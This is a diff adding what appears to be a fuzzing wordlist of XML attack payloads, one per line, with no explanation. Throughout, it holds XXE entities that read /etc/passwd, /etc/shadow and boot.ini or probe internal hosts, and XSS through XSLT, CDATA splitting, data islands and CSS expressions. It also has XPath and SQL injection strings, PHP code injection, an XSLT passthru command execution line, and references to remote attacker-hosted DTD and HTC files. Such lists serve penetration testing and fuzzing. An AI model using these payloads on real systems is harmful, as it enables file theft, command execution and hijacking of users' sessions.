@@ -1,0 +1,71 @@
+<!DOCTYPE	html[	<!ENTITY	%	foo	SYSTEM	"file:///etc/passwd">	%foo;]>	
+<!DOCTYPE html PUBLIC "" ""><style xmlns="http://www.w3.org/1999/xhtml ">*{animation-name:a}@-ms-keyframes a{0%{font:menu
+<!DOCTYPE html><script>(d=document).createElement("table").appendChild(d.createElement("head"))</script>
+<!ENTITY % three SYSTEM "file:///etc/passwd">
+<!ENTITY % two "<!ENTITY % four SYSTEM 'file:///%three;'>">
+[<!ENTITY nbsp "'">]
+<XML SRC="http://xss.cx/evil1.dtd" ID=I></XML>
+<meta http-equiv="X-UA-Compat" content="IE=8"><h3><a></a><a><b></a></h3><style>*:after{content:counter(x);
+<xml id=cdcat><note><to>%26lt;span style=x:exp<![CDATA[r]]>ession(alert(3))%26gt;hello%26lt;/span%26gt;</to></note></xml><table border=%221%22 datasrc=%22%23cdcat%22><tr><td><span datafld=%22to%22 DATAFORMATAS=html></span></td></tr></table>
+<xml id=cdcat><note><to>%26lt;span style=x:exp<![CDATA[r]]>ession(confirm(3))%26gt;hello%26lt;/span%26gt;</to></note></xml><table border=%221%22 datasrc=%22%23cdcat%22><tr><td><span datafld=%22to%22 DATAFORMATAS=html></span></td></tr></table>
+<xml id=cdcat><note><to>%26lt;span style=x:exp<![CDATA[r]]>ession(confirm(3))%26gt;hello%26lt;/span%26gt;</to></note></xml><table border=%221%22 datasrc=%22%23cdcat%22><tr><td><span datafld=%22to%22 DATAFORMATAS=html></span></td></tr></table>
+<xml id="xss" src="test.htc"></xml><label dataformatas="html" datasrc="#xss" datafld="payload"></label>
+<?xml standalone?>
+<?xml version="1.0" standalone="no"?><html xmlns="http://www.w3.org/1999/xhtml"><head><style type="text/css">@font-face {font-family: y; src: url("font.svg#x") format("svg");} body {font: 100px "y";}</style></head><body>Hello</body></html>
+<?xml version="1.0"?><?xml-stylesheet type="text/xml" href="#stylesheet"?><!DOCTYPE doc [<!ATTLIST xsl:stylesheet  id    ID    #REQUIRED>]><svg xmlns="http://www.w3.org/2000/svg">    <xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">        <xsl:template match="/">            <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(1)"></iframe>        </xsl:template>    </xsl:stylesheet>    <circle fill="red" r="40"></circle></svg>
+<?xml version="1.0"?><?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?><root/>
+<?xml version="2.666666666666666666667666666">
+<xml/>&lt;/xml&gt;&lt;iframe/onload=alert(1)&gt;
+<?xml-stylesheet href="javascript:alert(1)"?><root/>
+<?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>
+<?xml-stylesheet type="text/css"?><!DOCTYPE x SYSTEM "test.dtd"><x>&x;</x>
+<?xml-stylesheet type="text/css"?><root style="x:expression(write(1))"/>
+<?xml-stylesheet type="text/css"?><root style="x:expression(write(1))"/>
+<?xml-stylesheet type="text/xsl" href="#" ?><stylesheet xmlns="http://www.w3.org/TR/WD-xsl"><template match="/"><eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.alert(1)</eval><if expr="new ActiveXObject('htmlfile').parentWindow.alert(2)"></if></template></stylesheet>
+<?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:test.xdr"/>
+<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://0x0:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]>
+<!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]><root>&foo;</root>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]><root>&foo;</root>
+<?xml version="1.0" encoding="ISO-8859-1"?><test></test>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://127.0.0.1:80" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://127.0.0.1:80" >]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://127.0.0.1:81" >]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo>
+<test></test>
+<![CDATA[<test></test>]]>
+&foo;
+%foo;
+count(/child::node())
+x' or name()='username' or 'x'='y
+<name>','')); phpinfo(); exit;/*</name>
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
+<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+<foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foo>
+<foo><![CDATA[' or 1=1 or ''=']]></foo>
+<xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
+<xml ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<xml SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<xml SRC="xsstest.xml" ID=I></xml>
+<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>
+<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc">
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><script>alert(123)</script></xsl:template></xsl:stylesheet>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:copy-of select="document('/etc/passwd')"/></xsl:template></xsl:stylesheet>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:value-of select="php:function('passthru','ls -la')"/></xsl:template></xsl:stylesheet>
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://www.example.com/text.txt" >]>
+<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]>
+<?xml version="1.0" standalone="yes"?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-family="Verdana" font-size="16" x="10" y="40">&xxe;</text></svg>
